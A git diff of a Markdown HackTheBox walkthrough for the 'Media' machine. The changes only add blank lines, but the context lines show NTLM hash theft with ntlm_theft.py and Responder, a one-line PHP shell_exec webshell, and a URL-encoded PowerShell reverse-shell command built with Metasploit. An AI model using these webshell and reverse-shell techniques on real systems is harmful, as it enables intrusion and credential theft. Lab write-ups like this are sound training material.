@@ -1,5 +1,7 @@
 # [HackTheBox - Media](https://app.hackthebox.com/machines/Media)
+
 ![45875114e37755b090f67430a777c14d.png](/resources/45875114e37755b090f67430a777c14d.png)
+
 ## Table of Contents
 
 - [Abstract](#abstract)
@@ -46,6 +48,7 @@ python ntlm_theft.py -g all -s 10.10.14.24 -f vdo
 I upload the `wax` payload here since it can be used by Windows Media player and now what left is to setup a responder to capture NTLM hash.
 
 ![a89b9f69292164e73ecb4dcb545ca744.png](/resources/a89b9f69292164e73ecb4dcb545ca744.png)
+
 ![72228c905619381b5f1dde50ddcf1ff6.png](/resources/72228c905619381b5f1dde50ddcf1ff6.png)
 
 After setup the responder, I recieved NTLMv2 hash of enox user right away.
@@ -71,6 +74,7 @@ Using SSH to get the foothold and loot user flag
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" enox@$IP
 ```
 ![029245363fc2b1271c49a1524b9f239c.png](/resources/029245363fc2b1271c49a1524b9f239c.png)
+
 ![724437fb6afdf858d3a2a17a7f516504.png](/resources/724437fb6afdf858d3a2a17a7f516504.png)
 
 ## Privilege Escalation with to SYSTEM with Webshell
@@ -108,6 +112,7 @@ Next, I upload the simple webshell here with the upload functionaility of the we
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
 ```
 ![9065ab50957a488127b9b90f692a46d2.png](/resources/9065ab50957a488127b9b90f692a46d2.png)
+
 ![8439ee02a2984b9082f02b06069be781.png](/resources/8439ee02a2984b9082f02b06069be781.png)
 
 On the webroot, I can see that my webshell was really uploaded to webroot as expected.
@@ -121,6 +126,7 @@ curl http://10.129.214.161/commandshell.php?cmd=whoami
 ![df3fb30e6c6ca6f7b60f5c71095e09fb.png](/resources/df3fb30e6c6ca6f7b60f5c71095e09fb.png)
 
 And beside that, it was hosted with restricted privielge as well.
+
 ![d465e2b662af6f0bcc6e9ce87ab32da2.png](/resources/d465e2b662af6f0bcc6e9ce87ab32da2.png)
 
 Now to be able to get a reverse shell, I use web delivery module of metasploit framework to create powershell reverse shell payload.
@@ -140,6 +146,7 @@ Then I encode the payload with "URL encode" recipe from Cyberchef and now I get 
 curl 'http://10.129.214.161/commandshell.php?cmd=powershell.exe%20-nop%20-w%20hidden%20-e%20<...SNIP...>'
 ```
 ![66e4e83908dfe91b354b2ad9b9cdabb7.png](/resources/66e4e83908dfe91b354b2ad9b9cdabb7.png)
+
 ![fe2ecc134e9d18427973a2bbf6ce8d1d.png](/resources/fe2ecc134e9d18427973a2bbf6ce8d1d.png)
 
 Normally, Local Service account would have more privilege than this including SeAssignPrimaryTokenPrivilege and SeImpersonatePrivilege so I will use [FullPowers](https://github.com/itm4n/FullPowers) to restore all privileges of Local Service which will be used to get SYSTEM privilege later.
@@ -164,5 +171,6 @@ Now I loot the root flag and root the box :D
 ![816da963d3635223439edf5393d1f654.png](/resources/816da963d3635223439edf5393d1f654.png)
 
 ![b31d30259afc1a81e4396392ccd3ec98.png](/resources/b31d30259afc1a81e4396392ccd3ec98.png)
+
 https://labs.hackthebox.com/achievement/machine/1438364/718
 ***
